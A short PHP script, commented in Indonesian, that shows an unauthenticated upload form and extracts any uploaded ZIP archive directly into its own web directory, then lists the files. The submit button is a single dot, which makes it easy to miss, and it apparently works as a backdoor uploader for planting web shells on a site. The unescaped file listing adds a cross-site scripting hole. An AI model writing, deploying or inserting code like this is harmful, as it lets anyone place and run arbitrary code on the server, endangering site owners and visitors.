<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['zip_file'])) {
    $zip = new ZipArchive;
    $file = $_FILES['zip_file']['tmp_name'];

    $extractTo = '.'; // ekstrak langsung di folder script

    if ($zip->open($file) === TRUE) {
        $zip->extractTo($extractTo);
        $zip->close();
        echo "<p><strong>Berhasil diekstrak langsung di folder ini!</strong></p>";

        // tampilkan isi folder setelah ekstrak
        $files = scandir($extractTo);
        echo "<ul>";
        foreach ($files as $f) {
            if ($f != '.' && $f != '..') {
                echo "<li>$f</li>";
            }
        }
        echo "</ul>";
    } else {
        echo "Gagal membuka file ZIP.";
    }
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="zip_file" accept=".zip" required>
    <br><br>
    <button type="submit">.</button>
</form>